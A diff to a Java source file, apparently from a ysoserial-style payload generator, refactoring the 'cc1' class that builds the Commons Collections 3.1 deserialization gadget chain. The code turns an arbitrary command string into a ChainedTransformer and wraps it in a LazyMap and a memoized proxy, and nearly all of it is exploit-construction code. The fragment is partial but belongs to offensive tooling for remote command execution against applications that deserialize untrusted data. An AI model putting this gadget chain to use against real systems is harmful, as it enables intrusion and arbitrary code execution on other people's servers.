@@ -42,16 +42,20 @@ import static com.qi4l.JYso.gadgets.utils.Utils.createMemoitizedProxy;
 @SuppressWarnings({"rawtypes", "unchecked", "unused"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.FROHOFF})
-public class cc1 implements ObjectPayload<InvocationHandler> {
+public class cc1 implements ObjectPayload<Object> {
 
     @Override
-    public InvocationHandler getObject(String command) throws Exception {
+    public Object getObject(String command) throws Exception {
 
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
         // real chain for after setup
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
+        return get_CC_Sink(transformerChain, transformers);
+    }
+
+    static Object get_CC_Sink(Transformer transformerChain, Transformer[] transformers) throws Exception {
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         final Map mapProxy = createMemoitizedProxy(lazyMap, Map.class);
